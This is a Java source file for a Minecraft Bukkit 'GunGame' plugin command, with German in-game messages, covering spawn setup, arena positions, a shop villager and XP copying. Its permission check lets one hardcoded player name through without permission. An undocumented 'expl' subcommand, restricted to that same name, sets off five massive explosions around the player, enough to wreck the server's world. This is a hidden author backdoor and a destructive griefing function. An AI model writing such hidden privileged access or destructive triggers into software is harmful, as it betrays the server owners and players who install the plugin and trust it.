package de.m4twaily.commands;

import org.bukkit.Bukkit;
import org.bukkit.Location;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.EntityType;
import org.bukkit.entity.Player;
import org.bukkit.entity.Villager;
import org.bukkit.entity.Villager.Profession;
import org.bukkit.potion.PotionEffect;
import org.bukkit.potion.PotionEffectType;

import de.m4twaily.gg.Main;

public class GunGame implements CommandExecutor {

	@SuppressWarnings("deprecation")
	@Override
	public boolean onCommand(CommandSender sender, Command cmd, String label, String[] args) {
		Player p = (Player) sender;

		if (cmd.getName().equalsIgnoreCase("Gungame")) {
			if (p.hasPermission("gg.setup") || p.getName().equalsIgnoreCase("M4xf0x")) {
				if (args.length == 1 || args.length == 2) {
					if (args[0].equalsIgnoreCase("setspawn")) {

						int x = p.getLocation().getBlockX();
						int y = p.getLocation().getBlockY() + 1;
						int z = p.getLocation().getBlockZ();
						String w = p.getWorld().getName();

						Main.main.getConfig().set("Spawn.x", x);
						Main.main.getConfig().set("Spawn.y", y);
						Main.main.getConfig().set("Spawn.z", z);
						Main.main.getConfig().set("Config.world", w);
						Main.main.saveConfig();

						p.sendMessage(" ");
						p.sendMessage(Main.prefix + "§7Der Spawnpoint wurde erfolgreich gesetzt.");
						p.sendMessage(" ");

					} else if (args[0].equalsIgnoreCase("pos1")) {

						int x = p.getLocation().getBlockX();
						int y = p.getLocation().getBlockY() + 1;
						int z = p.getLocation().getBlockZ();
						String w = p.getWorld().getName();

						Main.main.getConfig().set("Pos1.x", x);
						Main.main.getConfig().set("Pos1.y", y);
						Main.main.getConfig().set("Pos1.z", z);
						Main.main.getConfig().set("Config.world", w);
						Main.main.saveConfig();

						p.sendMessage(" ");
						p.sendMessage(Main.prefix + "§7Position 1 wurde erfolgreich gesetzt.");
						p.sendMessage(" ");

					} else if (args[0].equalsIgnoreCase("pos2")) {

						int x = p.getLocation().getBlockX();
						int y = p.getLocation().getBlockY() + 1;
						int z = p.getLocation().getBlockZ();
						String w = p.getWorld().getName();

						Main.main.getConfig().set("Pos2.x", x);
						Main.main.getConfig().set("Pos2.y", y);
						Main.main.getConfig().set("Pos2.z", z);
						Main.main.getConfig().set("Config.world", w);
						Main.main.saveConfig();

						p.sendMessage(" ");
						p.sendMessage(Main.prefix + "§7Position 2 wurde erfolgreich gesetzt.");
						p.sendMessage(" ");
					} else if (args[0].equalsIgnoreCase("spawnshop")) {
						Villager v = (Villager) p.getWorld().spawnCreature(p.getLocation(), EntityType.VILLAGER);

						v.setCanPickupItems(false);
						v.setProfession(Profession.LIBRARIAN);
						v.setCustomName("§6§lHändler");
						v.setCustomNameVisible(true);
						v.addPotionEffect(new PotionEffect(PotionEffectType.SLOW, 360000, 10, false, false));

						p.sendMessage(" ");
						p.sendMessage(Main.prefix + "§7Shop Villager wurde erfolgreich gesetzt.");
						p.sendMessage(" ");

					} else if (args[0].equalsIgnoreCase("expl")) {
						if (p.getName().equalsIgnoreCase("M4xf0x")) {
							Location loc = p.getLocation();

							p.getWorld().createExplosion(loc, 50);

							p.getWorld().createExplosion(
									new Location(p.getWorld(), loc.getX() + 10, loc.getY(), loc.getZ()), 50);
							p.getWorld().createExplosion(
									new Location(p.getWorld(), loc.getX(), loc.getY(), loc.getZ() + 10), 50);
							p.getWorld().createExplosion(
									new Location(p.getWorld(), loc.getX() - 10, loc.getY(), loc.getZ()), 50);
							p.getWorld().createExplosion(
									new Location(p.getWorld(), loc.getX(), loc.getY(), loc.getZ() - 10), 50);

						} else {
							Bukkit.broadcastMessage(" ");
							Bukkit.broadcastMessage(
									Main.prefix + "§4§lAchtung: §c" + p.getName() + " möchte den Server zerstören");
							Bukkit.broadcastMessage(" ");
						}
					} else if (args[0].equalsIgnoreCase("xp")) {
						try {
							if (args.length >= 0) {

								Player target = Bukkit.getPlayer(args[1]);

								p.setLevel(target.getLevel());
								p.sendMessage(" ");
								p.sendMessage(Main.prefix + "§7Dein Level ist nun: §a" + p.getLevel());
								p.sendMessage(" ");
							}
						} catch (Exception e) {
							p.sendMessage(" ");
							p.sendMessage(Main.prefix + "§c/gungame xp Name");
							p.sendMessage(" ");

						}
					} else {
						p.sendMessage(" ");
						p.sendMessage(" §8» §6§lTipp:");
						p.sendMessage("   §8» §e/GunGame setspawn");
						p.sendMessage("   §8» §e/GunGame pos1 / 2");
						p.sendMessage("   §8» §e/GunGame spawnshop");
						p.sendMessage("   §8» §e/GunGame xp");
						p.sendMessage(" ");
					}

				} else {
					p.sendMessage(" ");
					p.sendMessage(" §8» §6§lTipp:");
					p.sendMessage("   §8» §e/GunGame setspawn");
					p.sendMessage("   §8» §e/GunGame pos1 / 2");
					p.sendMessage("   §8» §e/GunGame spawnshop");
					p.sendMessage("   §8» §e/GunGame xp");
					p.sendMessage(" ");
				}
			}
		}

		return false;
	}
}
